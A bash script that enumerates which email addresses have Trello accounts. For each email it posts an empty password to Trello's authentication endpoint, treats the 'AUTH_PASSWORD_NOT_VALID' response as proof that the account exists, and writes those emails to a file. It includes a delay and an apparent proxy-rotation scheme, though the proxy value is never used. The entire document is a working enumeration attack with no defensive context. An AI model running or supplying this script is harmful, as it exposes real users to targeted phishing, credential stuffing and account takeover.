#!/bin/bash
proxL=$(cat $2 | wc -l); iter=1
for email in `cat $1`; do
prox=$(cat $2 | head -$iter | tail -1)
if [ $iter -gt $proxL ];then iter=1; fi
curl  -m3 -c cuckie -b cuckie -s -XGET "https://trello.com/auth/saml/authorization?user=$email&returnUrl=/"
curl -s -m3 -b cuckie -c cuckie -A -XPOST -g -d "method=password&factors[user]=$email&factors[password]=" https://trello.com/1/authentication | grep "AUTH_PASSWORD_NOT_VALID"
if [ $? -eq 0 ]; then
	echo "$email" >> trelloxist
	echo "Good"
else
	echo "Bad"
fi
rm -f cuckie
sleep 3; iter=$(($iter + 1))
done
